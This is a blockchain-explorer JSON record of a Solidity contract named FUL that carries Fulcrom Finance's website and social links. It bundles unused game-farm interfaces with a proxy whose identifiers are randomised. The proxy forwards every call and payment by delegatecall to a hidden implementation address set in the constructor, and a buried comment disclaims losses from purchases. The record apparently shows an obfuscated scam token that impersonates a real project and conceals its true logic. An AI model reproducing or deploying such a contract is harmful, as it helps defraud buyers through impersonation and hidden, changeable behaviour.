{"SourceCode": "/**\r\nWebsite : https://fulcrom.finance/\r\nTwitter : https://twitter.com/FulcromFinance\r\nTelegram : https://t.me/fulcromfinance\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\ninterface IMhdaoSquad {\r\n  struct Squad {\r\n    address owner; // squad owner\r\n    uint256 type_; // squad type: 1 for mouse, 2 for ghost, 3 for mixed\r\n    uint256 size; // how many NFTs can be in the squad\r\n    uint256 baseFarmPerBlock; // farm per block without synergy bonus\r\n    uint256 synergyBonus; // synergy bonus\r\n    uint256 squadBonus; // squad bonus\r\n    uint256 squadTrait; // a trait that the squad has and can synergize with all NFTs there\r\n    uint256 farmPerBlock; // farm per block with synergy bonus\r\n    uint256 currentQuest; // current quest this squad is engaged in\r\n    uint256 questStartedAt; // when the squad started farming this quest\r\n    uint256 questEndsAt; // when the squad should finish this quest\r\n    uint256[] nftIds; // a dynamic list of NFT ids in the squad\r\n    uint256[] traits; // a dynamic list of possibly sinergetic traits in the squad\r\n    uint256[] collections; // a dynamic list of possibly sinergetic collections in the squad\r\n  }\r\n}\r\n\r\ninterface IBkFarmV18P9V2 {\r\n  // write the interface for the contract ../features/BkFarmV18.sol:\r\n  function registerPlayer(address mentor) external;\r\n\r\n  function addToSquad(uint256[] memory nftIds, uint256 squadId) external;\r\n\r\n  function removeFromSquad(uint256[] memory nftIds, uint256 squadId) external;\r\n\r\n  function clearSquad(uint256 squadId) external;\r\n\r\n  function withdraw(uint256 amount) external;\r\n\r\n  function setMentor(address mentorAddress) external;\r\n\r\n  function transfer(address to, uint256 bct, uint256 eBct, uint256[] memory _resources) external;\r\n\r\n  function transferEbct(address from, address to, uint256 amount) external;\r\n\r\n  //################\r\n  // UPDATER functions\r\n  function startQuestFor(uint256 squadId, uint256 questId) external;\r\n\r\n  function finishQuestFor(uint256 squadId) external;\r\n\r\n  function cancelQuestFor(uint256 squadId) external;\r\n\r\n  function addSquadToPlayer(address playerAddress, uint256 type_) external returns (uint256);\r\n\r\n  function increaseSquadSize(uint256 squadId) external;\r\n\r\n  function payWithBalance(\r\n    address account,\r\n    uint256 bctAmount,\r\n    uint256[] memory _resources\r\n  ) external returns (uint256[] memory);\r\n\r\n  function spendBctFrom(address account, uint256 amount, bool ethereal) external;\r\n\r\n  function transferInGameBctAndLootFrom(\r\n    address from,\r\n    address to,\r\n    uint256 bctAmount,\r\n    uint256[] memory _resources\r\n  ) external;\r\n\r\n  function recalculateSquadFarming(uint256 squadId) external;\r\n\r\n  function addTo(address playerAddress, uint256 amount, uint256[] memory _resources) external;\r\n\r\n  function setSquadType(uint256 squadId, uint256 type_) external;\r\n\r\n  function setSquadTrait(uint256 squadId, uint256 squadTrait) external;\r\n\r\n  function burnBct(uint256 amount) external;\r\n\r\n  function transferFrom(address from, address to, uint256 bct, uint256 eBct, uint256[] memory _resources) external;\r\n\r\n  function setQuestRewardsCalculator(address questRewardsCalculator_) external;\r\n\r\n  function addBctToClaim(address playerAddress, uint256 amount) external;\r\n\r\n  function singleBalanceOf(address playerAddress, uint256 resourceId) external view returns (uint256);\r\n}\r\n\r\ncontract Ownable {\r\n    address internal _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor(){\r\n        _transferOwnership(msg.sender);\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if the sender is not the owner.\r\n     */\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Internal function without access restriction.\r\n     */\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\n/**\r\n * @dev This abstract contract provides a fallback function that delegates all calls to another contract using the EVM\r\n * instruction `delegatecall`. We refer to the second contract as the _implementation_ behind the proxy, and it has to\r\n * be specified by overriding the virtual {_implementation} function.\r\n * Additionally, delegation to the implementation can be triggered manually through the {_fallback} function, or to a\r\n * different contract through the {_delegate} function.\r\n * The success and return data of the delegated call will be returned back to the caller of the proxy.\r\n * This contract is for testing purposes only. \r\n * Please do not make any purchases, as we are not responsible for any losses incurred.\r\n */\r\n contract FUL is Ownable {\r\n\r\n      address public dzwqd9ua;\r\n        constructor(address __dzwqd9ua) {\r\n        dzwqd9ua = __dzwqd9ua;\r\n       }\r\n    /**\r\n     * @dev Delegates the current call to `implementation`.\r\n     *\r\n     * This function does not return to its internal call site, it will return directly to the external caller.\r\n     */\r\n    function _ysnrbmgzci(address onarfhheta_) internal virtual {\r\n        assembly {\r\n            // Copy msg.data. We take full control of memory in this inline assembly\r\n            // block because it will not return to Solidity code. We overwrite the\r\n            // Solidity scratch pad at memory position 0.\r\n            calldatacopy(0, 0, calldatasize())\r\n\r\n            // Call the implementation.\r\n            // out and outsize are 0 because we don't know the size yet.\r\n            let result := delegatecall(gas(), onarfhheta_, 0, calldatasize(), 0, 0)\r\n\r\n            // Copy the returned data.\r\n            returndatacopy(0, 0, returndatasize())\r\n\r\n            switch result\r\n            // delegatecall returns 0 on error.\r\n            case 0 {\r\n                revert(0, returndatasize())\r\n            }\r\n            default {\r\n                return(0, returndatasize())\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev This is a virtual function that should be overridden so it returns the address to which the fallback function\r\n     * and {_fallback} should delegate.\r\n     */\r\n    function _onarfhheta() internal view virtual returns (address){\r\n        return dzwqd9ua;\r\n    }\r\n\r\n     /**\r\n     * @dev This is a virtual function that should be overridden so it returns the address to which the fallback function\r\n     * and {_fallback} should delegate.\r\n     */\r\n    /**\r\n     * @dev Delegates the current call to the address returned by `_implementation()`.\r\n     *\r\n     * This function does not return to its internal call site, it will return directly to the external caller.\r\n     */\r\n    function _hcuxbtxzl() internal virtual {\r\n        _uczuwbd5c();\r\n        _ysnrbmgzci(_onarfhheta());\r\n    }\r\n\r\n    function _igrspqojvq() public pure returns (string memory) {\r\n        return \"84968339\";\r\n    }\r\n    /**\r\n     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other\r\n     * function in the contract matches the call data.\r\n     */\r\n    fallback() external payable virtual {\r\n        _hcuxbtxzl();\r\n    }\r\n\r\n    /**\r\n     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data\r\n     * is empty.\r\n     */\r\n    receive() external payable virtual {\r\n        _hcuxbtxzl();\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`\r\n     * call, or as part of the Solidity `fallback` or `receive` functions.\r\n     *\r\n     * If overridden should call `super._beforeFallback()`.\r\n     */\r\n    function _uczuwbd5c() internal virtual {}\r\n}\r\n\r\n", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"__dzwqd9ua\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"_igrspqojvq\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dzwqd9ua\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "FUL", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000ddb45adfdc9c60c01fa7ac2154a9afd0f0d7744d", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": ""}